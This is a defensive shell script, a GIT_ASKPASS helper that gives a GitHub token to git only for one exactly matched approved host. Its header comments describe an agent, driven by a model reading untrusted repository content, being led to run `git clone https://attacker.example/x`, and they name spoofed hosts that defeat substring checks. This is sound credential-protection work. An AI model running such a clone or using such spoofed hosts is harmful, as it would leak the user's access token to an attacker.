#!/bin/sh
# GIT_ASKPASS helper: git calls this once for the username and once for the password when it needs
# HTTPS credentials. The token therefore never appears in the remote URL, the shell environment of
# tool subprocesses, or the command line.
#
# Credentials are released ONLY for the approved host. GIT_ASKPASS is set image-wide, so this also
# answers git commands the agent itself starts, and the agent is driven by a model that reads
# untrusted repository content: without a host check, `git clone https://attacker.example/x` inside
# the workspace makes git send the real PAT to that server as Basic auth, which is exactly the
# exfiltration GIT_ASKPASS exists to prevent.
#
# The host is compared for EXACT equality against the authority of the URL git names in its prompt.
# A substring test would accept `github.com.evil.test` and `https://github.com@evil.test`.
#
# POSIX sh, no external commands. Every failure path prints nothing on stdout and exits non-zero,
# so git fails authentication instead of reading an empty string as a valid password.
set -eu

prompt=${1:-}

# Approved host. Unset falls back to the only forge the product supports; set-but-empty is a
# misconfiguration and must fail closed rather than match anything.
allowed=${AH_GIT_ALLOWED_HOST-github.com}
if [ -z "$allowed" ]; then
  echo "askpass: AH_GIT_ALLOWED_HOST is set but empty; refusing to release credentials" >&2
  exit 1
fi

# Git prompts look like: Password for 'https://x-access-token@github.com'
# Take what is between the first pair of single quotes, then reduce it to a bare host: drop the
# scheme, keep the authority (up to the first "/"), drop any userinfo (up to the last "@"), drop
# the port. A prompt without quotes leaves `prompt` unchanged, which matches no approved host.
url=${prompt#*\'}
url=${url%%\'*}
authority=${url#*://}
authority=${authority%%/*}
host=${authority##*@}

# Reject an explicit port. The authority must name the approved host on the default HTTPS port:
# `github.com:8443` is still `github.com` to a substring or host-only test, but it is not the
# service this token belongs to, and the repository-URL schema already refuses non-default ports.
case "$host" in
  *:*)
    echo "askpass: refusing to release credentials to a non-default port" >&2
    exit 1
    ;;
esac

if [ "$host" != "$allowed" ]; then
  echo "askpass: refusing to release credentials to a host other than $allowed" >&2
  exit 1
fi

case "$prompt" in
  *Username*|*username*)
    printf '%s\n' "x-access-token"
    ;;
  *)
    # Token source. W1-B replaces this block with a tmpfs token file so the shell tool's children
    # can run with a scrubbed environment; the host check above is deliberately independent of it.
    if [ -z "${GITHUB_TOKEN:-}" ]; then
      echo "askpass: no GitHub token available" >&2
      exit 1
    fi
    printf '%s\n' "$GITHUB_TOKEN"
    ;;
esac
